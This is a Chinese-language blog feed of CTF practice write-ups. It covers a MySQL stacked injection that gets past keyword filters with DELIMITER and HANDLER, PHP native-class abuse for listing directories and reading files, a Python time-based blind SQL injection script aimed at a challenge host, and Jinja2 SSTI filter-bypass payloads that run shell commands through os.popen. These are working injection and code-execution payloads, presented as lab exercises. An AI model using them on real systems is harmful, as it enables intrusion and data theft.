      <title>Sql-Inject-or-RCE</title>
      <link href="/2025/03/27/Sql-Inject-or-RCE/"/>
      <url>/2025/03/27/Sql-Inject-or-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql-Inject-or-RCE"></a>Sql-Inject-or-RCE</h1><p>首先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>); ctfer! You can<span class="hljs-string">&#x27;t succeed this time! hahaha ctfer! You can&#x27;</span>t succeed this time! hahaha<br></code></pre></td></tr></table></figure><p>这题过滤掉了delete和select，并且分号也被过滤了。</p><p>但是在MySQL中有一个命令DELIMITER可以用，用法就是可以利用delimiter来更改一条sql语句的结束符</p><p>比如</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">delimiter</span> aa<br><span class="hljs-literal">select</span> aa<br></code></pre></td></tr></table></figure><p>所以这道题我们可以利用这个delimiter更改结束符，然后来打堆叠注入，利用handler读表来绕过，但是因为first被过滤了，可以用read next来绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">hackbar或者bp中传入<br><br>?sql=<span class="hljs-variable">%0adelimiter</span> cnm<span class="hljs-variable">%0ahandler</span> flag opencnm<span class="hljs-variable">%0ahandler</span> flag <span class="hljs-keyword">read</span>+<span class="hljs-keyword">next</span><br></code></pre></td></tr></table></figure><p>这里每个命令之前必须加个%0a换行符，并且命令结尾用我们定义的结束符结束</p><p>空格可使用url编码%20也可以不用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> handler读表 </tag>
            
            <tag> delimiter更改sql语句结束符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP原生类</title>
      <link href="/2025/03/27/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2025/03/27/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>原地址<a href="https://blog.csdn.net/weixin_54902210/article/details/124689580">PHP反序列化原生类利用</a></p><p>php中内置很多原生的类，在CTF中常以<code>echo new $a($b);</code>这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。</p><h2 id="目录遍历类"><a href="#目录遍历类" class="headerlink" title="目录遍历类"></a>目录遍历类</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>这个类会创建一个指定目录的迭代器，当遇到<code>echo</code>输出时会触发<code>Directorylterator</code>中的<code>__toString()</code>方法，输出指定目录里面经过排序之后的第一个文件名。</p><p>可以结合glob协议使用</p><p>例如：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?a<span class="hljs-punctuation">=</span>Directorylterator<span class="hljs-meta">&amp;b=glob:<span class="hljs-comment">//f*</span></span><br></code></pre></td></tr></table></figure><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>该类继承于<code>Directorylterator</code>，所以在用法上基本也是一样的。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?a<span class="hljs-punctuation">=</span>Filesystemlterator<span class="hljs-meta">&amp;b=glob:<span class="hljs-comment">//f*</span></span><br></code></pre></td></tr></table></figure><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>这个类自带<code>glob</code>协议，调用时不需要再加上<code>glob://</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=Globlterator&amp;b=f*<br></code></pre></td></tr></table></figure><hr><h2 id="文件读取类"><a href="#文件读取类" class="headerlink" title="文件读取类"></a>文件读取类</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><p>当我们遍历到了敏感文件时，可以用SplFileObject类读取文件，同样通过echo触发<code>SplFileObject</code>中的<code>__toString()</code>方法。</p><p>但是该类不支持通配符，必须先获取到完整的文件名才能读取</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=SplFileObject&amp;b=flag<br></code></pre></td></tr></table></figure><p>并且<code>SplFileObject</code>类，只能读取文件的第一行内容，如果要全部读取需要用到foreach函数，也可以使用伪协议读取文件中的内容。</p><p>一般都是使用伪协议</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?a=SplFileObject&amp;b=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=flag<br></code></pre></td></tr></table></figure><p>如果题目是echo new$a($b)-&gt;$c()这种类型</p><p>可以主动调用__toString方法</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?a=SplFileObject&amp;b=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=flag&amp;c=__toString<br></code></pre></td></tr></table></figure><h2 id="报错类"><a href="#报错类" class="headerlink" title="报错类"></a>报错类</h2><h3 id="Error和Exception"><a href="#Error和Exception" class="headerlink" title="Error和Exception"></a>Error和Exception</h3><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>若代码是这种有eval的形式，则可以进行命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$a</span>(<span class="hljs-subst">$b</span>());&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里就不仅限于Error和Exception了，基本上所有的原生类都可以</p><hr><h2 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h2><h3 id="ReflectionMethod-获取类方法的相关信息"><a href="#ReflectionMethod-获取类方法的相关信息" class="headerlink" title="ReflectionMethod 获取类方法的相关信息"></a>ReflectionMethod 获取类方法的相关信息</h3><p>可以结合<code>getDocComment()</code> 方法，用它来获取类中各个函数注释内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sentiment</span></span>&#123;<br>    <span class="hljs-comment">/** flag&#123;asdasd&#125; */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">getDocComment</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="ZipArchive-文件操作"><a href="#ZipArchive-文件操作" class="headerlink" title="ZipArchive 文件操作"></a>ZipArchive 文件操作</h3><p>可以通过本类执行一些文件操作，在CTF可以用来删除waf</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ZipArchive::addEmptyDir：添加一个新的文件目录<br>ZipArchive::addFile：将文件添加到指定zip压缩包中<br>ZipArchive::addFromString：添加新的文件同时将内容添加进去<br>ZipArchive::close：关闭ziparchive<br>ZipArchive::extractTo：将压缩包解压<br>ZipArchive::open：打开一个zip压缩包<br>ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：<span class="hljs-built_in">deleteIndex</span>(<span class="hljs-number">0</span>)代表删除第一个文件<br>ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除<br><br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>;<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;web.zip&#x27;</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>)<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>第一个参数：要打开的压缩包文件</p><p>第二个参数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ZIPARCHIVE::OVERWRITE总是创建一个新的文件，如果指定的zip文件存在，则会覆盖掉。<br><br>ZIPARCHIVE::CREATE如果指定的zip文件不存在，则新建一个。<br><br>ZIPARCHIVE::EXCL如果指定的zip文件存在，则会报错。<br><br>ZIPARCHIVE::CHECKCONS对指定的zip执行其他一致性测试。<br></code></pre></td></tr></table></figure><p>之后会在当前目录创建个web.zip，但可能由于环境原因没有打出来</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> PHP原生类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>only-one-sql</title>
      <link href="/2025/03/27/only-one-sql/"/>
      <url>/2025/03/27/only-one-sql/</url>
      
        <content type="html"><![CDATA[<h1 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only-one-sql"></a>only-one-sql</h1><p>首先先看题目，源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-comment">//flag in ctf.flag</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>); 没有select，让你执行一句又如何 没有select，让你执行一句又如何<br></code></pre></td></tr></table></figure><p>很明显是sql注入，但是过滤了select，并且只能执行一句sql语句</p><p>所以无法通过常规查询来查询flag，可以先使用show来查看表和表结构</p><p>首先</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询所有表<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span><br><br><span class="hljs-meta">#output</span><br>Tables_in_ctf flag<br></code></pre></td></tr></table></figure><p>可以看到flag表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询flag表中的所有列<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> flag<br><br><span class="hljs-meta">#output</span><br>Field <span class="hljs-keyword">Type</span> <span class="hljs-keyword">Null</span> Key <span class="hljs-keyword">Default</span> Extra id <span class="hljs-type">varchar</span>(<span class="hljs-number">300</span>) YES <span class="hljs-keyword">NULL</span> data <span class="hljs-type">varchar</span>(<span class="hljs-number">300</span>) YES <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>可以看到id和data两个字段，猜测flag在字段data中</p><p>然后使用时间盲注，这里select不能用了，但是可以使用delete命令来进行时间盲注</p><p>使用语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">where</span> data <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;f%&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>完整脚本：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">import requests<br>import string<br><br>sqlstr = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20099/?sql=delete<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0flag<span class="hljs-variable">%2</span>0where<span class="hljs-variable">%2</span>0data<span class="hljs-variable">%2</span>0like<span class="hljs-variable">%2</span>0<span class="hljs-variable">%27</span>&quot;</span><br>end=<span class="hljs-string">&quot;<span class="hljs-variable">%2</span>5<span class="hljs-variable">%2</span>7<span class="hljs-variable">%2</span>0and<span class="hljs-variable">%20sleep</span>(5)&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c in sqlstr:<br>        payload = url +flag+ c + end<br>        try:<br>            r = requests.get(payload,timeout=<span class="hljs-number">4</span>)<br>        except:<br>            <span class="hljs-keyword">print</span>(flag+c)<br>            flag+=c<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后就能跑出flag了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复读机</title>
      <link href="/2025/03/26/%E5%A4%8D%E8%AF%BB%E6%9C%BA/"/>
      <url>/2025/03/26/%E5%A4%8D%E8%AF%BB%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h1><p>首先打开靶机发现很明显是ssti，但是会检测开头，开头必须是BaseCTF</p><p>然后测试过滤，过滤了以下符号</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">+</span> <span class="hljs-punctuation">-</span> * / . &#123;&#123; &#125;&#125; __ <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot; \</span><br></code></pre></td></tr></table></figure><p>先去找能够进行RCE的类比如 <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，’.’被过滤了，用中括号绕过，一些关键字被过滤，在关键字中间插入一对单引号 <code>&#39;&#39;</code>绕过</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">BaseCTF&#123;%print(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>])%&#125;<br></code></pre></td></tr></table></figure><p>然后测试一下能否命令执行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">BaseCTF&#123;%print(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;pwd&#x27;</span>)[<span class="hljs-string">&#x27;rea&#x27;</span><span class="hljs-string">&#x27;d&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><p>发现成功执行</p><p>但是这里过滤了斜杠&#x2F;和反斜杠，我们需要利用chr函数构造斜杠</p><p>首先先找到并set一个chr函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>= <span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_bui&#x27;</span><span class="hljs-string">&#x27;ltins_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;chr&#x27;</span>]%&#125;<br>&#123;% <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>) %&#125;<br></code></pre></td></tr></table></figure><hr><p>利用chr函数和~拼接构造命令</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">BaseCTF</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr= <span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_bui&#x27;</span><span class="hljs-string">&#x27;ltins_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;chr&#x27;</span>]<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cmd=<span class="hljs-string">&#x27;cat &#x27;</span>~chr(<span class="hljs-number">47</span>)~<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](cmd)[<span class="hljs-string">&#x27;rea&#x27;</span><span class="hljs-string">&#x27;d&#x27;</span>]())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><hr><p>最后把 cmd 作为 popen 的参数传递进去，即可得到 flag</p><p><strong>同理，利用 format 来得到 <code>/</code> 也是可以的</strong></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">BaseCTF</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cmd=<span class="hljs-string">&#x27;cat &#x27;</span>~<span class="hljs-string">&#x27;%c&#x27;</span>%(<span class="hljs-number">47</span>)~<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cl&#x27;</span><span class="hljs-string">&#x27;ass_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_ba&#x27;</span><span class="hljs-string">&#x27;se_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcla&#x27;</span><span class="hljs-string">&#x27;sses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](cmd)[<span class="hljs-string">&#x27;rea&#x27;</span><span class="hljs-string">&#x27;d&#x27;</span>]())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="chr函数"><a href="#chr函数" 